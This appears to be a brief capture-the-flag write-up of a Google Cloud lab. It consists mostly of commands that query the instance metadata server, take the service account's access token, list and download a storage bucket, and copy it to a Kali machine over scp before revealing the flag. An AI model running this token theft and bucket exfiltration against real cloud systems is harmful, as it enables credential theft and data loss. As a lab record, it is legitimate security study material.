# 21077e_cloud_hacking_1

get metadata 
```
curl "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true" -H "Metadata-Flavor: Google"

{"bucket":"en2720-2017-2023-en2720-w1-8da680b871c76380dc3522ce3c4cc127c713","sourcerepo":"twmn_sourcerepo_en2720-w1"}
```

get access token
```
gcloud auth print-access-token

gcloud config list

# or
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

get single bucket
```
# use gsutil
gsutil ls # access Permission 'storage.buckets.list'
gsutil ls gs://en2720-2017-2023-en2720-w1-8da680b871c76380dc3522ce3c4cc127c713
gsutil cp -r gs://en2720-2017-2023-en2720-w1-8da680b871c76380dc3522ce3c4cc127c713/ .

# use curl
curl "https://www.googleapis.com/storage/v1/b/en2720-2017-2023-en2720-w1-8da680b871c76380dc3522ce3c4cc127c713/o?project=en2720-2017"  -H "Authorization: Bearer $(gcloud auth print-access-token)"
curl "https://storage.googleapis.com/storage/v1/b/BUCKET/o/<object>?project=en2720-2017&alt=media" -H "Authorization: Bearer $TOKEN"


# kali machine
scp -r -P 52961 -i id_rsa_root root@10.0.7.127:/root/en2720-2017-2023-en2720-w1-8da680b871c76380dc3522ce3c4cc127c713/ .

flag{21077e642329aaf28d45e8dc3800db766b9b4e94c0412e}.jpg

```
